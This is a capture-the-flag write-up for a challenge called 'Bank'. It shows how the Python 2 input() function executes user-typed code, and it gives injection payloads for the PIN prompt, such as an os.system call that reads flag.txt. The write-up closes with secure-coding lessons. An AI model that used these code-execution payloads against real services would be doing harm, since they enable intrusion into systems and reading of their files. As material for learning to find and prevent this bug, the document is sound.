# 🧩 Bank — Writeup
## 📌 Challenge Information


* **Challenge Name:** Bank
* **Category:** MISC
* **Final Flag:** `SoterCTF{4a14fd9fb604ba66bbe326c84f0bdbe3}`

---

# 📝 Challenge Description

> A group of hackers has gained access to the internal server of PalCam Bank, the country's most exclusive financial institution. However, the next-generation authentication system blocks any intruder from entering.
>
> Rumor has it that somewhere on that server there is an account with privileged access. To reach it, you will have to overcome three layers of security designed by the bank's best engineering team.
>
> Are you capable of outsmarting the system and proving that no vault is impregnable?

Connection:

```text id="j4k9tp"
nc 173.212.252.46 7340
```

---

# 🧠 Initial Analysis

The service simulated a banking login with multiple security checks:

1. Username
2. PIN
3. Verification token

At first glance, the PIN was random and the token depended on time and system values, which made brute force impractical.

So instead of attacking the values directly, the better path was to inspect how user input was handled.

---

# 🔍 Key Vulnerability

The application used:

```python id="x1m7qw"
pin = input("PIN: ")
user_token = input("Token: ")
```

This is dangerous in **Python 2**.

In Python 2:

```text id="p8r2dn"
input() = eval(raw_input())
```

That means whatever the user types is executed as Python code.

So this was not just a login form — it was an **arbitrary code execution vulnerability**.

---

# 🚨 Why This Breaks Authentication

The program stored internal values such as:

* `users`
* `username`
* Generated PIN
* Verification token

Since `input()` evaluates code in the current scope, we can directly access those variables.

No guessing required.

---

# 🧪 Step 1 — Connect to the Service

```bash id="z5n8ek"
nc 173.212.252.46 7340
```

The server prompts for a username.

We use:

```text id="m3v6ra"
admin
```

---

# 🧪 Step 2 — Exploit the PIN Prompt

Instead of entering a 4-digit number, we inject Python code:

```python id="u2q9cs"
__import__('os').system('cat flag.txt') or users['admin']
```

### What this does:

* Runs `cat flag.txt`
* Prints the flag immediately
* Then returns the real admin PIN so execution continues

This bypasses the PIN check completely.

---

# 💻 Example Session

```text id="t7w4lf"
=== Secure Banking Access v2.0 ===

Username: admin
PIN: __import__('os').system('cat flag.txt') or users['admin']

SoterCTF{4a14fd9fb604ba66bbe326c84f0bdbe3}
```

The flag is revealed before the token step even matters.

---

# 🔐 Alternative Payloads

You could also use:

```python id="n1x5dy"
users['admin']
```

To get the correct PIN directly.

Or:

```python id="h6k3pb"
open('flag.txt').read()
```

To read the file contents.

---

# 🚩 Final Flag

```text id="q9m2vk"
SoterCTF{4a14fd9fb604ba66bbe326c84f0bdbe3}
```

---

# 🛠️ Tools Used

* `nc`
* Python knowledge
* Code review
* Input injection

---

# 🧠 Key Insights

## 🔹 Python 2 `input()` Is Unsafe

It evaluates input as code.

## 🔹 Strong Authentication Can Still Fail

Random PINs and tokens do not help if input handling is broken.

## 🔹 Scope Exposure Matters

Sensitive variables were directly accessible.

## 🔹 Look for Logic Bugs First

Sometimes the fastest path is not brute force, but abusing implementation mistakes.

---

# 📚 Lessons Learned

* Never use Python 2 `input()` for user data
* Use safe parsing functions instead
* Keep secrets out of user-controlled execution scope
* One insecure function can break an entire system

---

# 🚀 Conclusion

This challenge looked like a multi-layer authentication system, but the real weakness was unsafe Python 2 input handling.

By injecting Python code into the PIN prompt, we executed commands on the server, read the flag file, and bypassed the intended security model entirely.

---

# 🏁 Flag

```text id="w8c4zn"
SoterCTF{4a14fd9fb604ba66bbe326c84f0bdbe3}
```
<img width="1032" height="815" alt="image" src="https://github.com/user-attachments/assets/00f58ea5-f07f-4fbc-8e7f-d9ef94e0d250" />
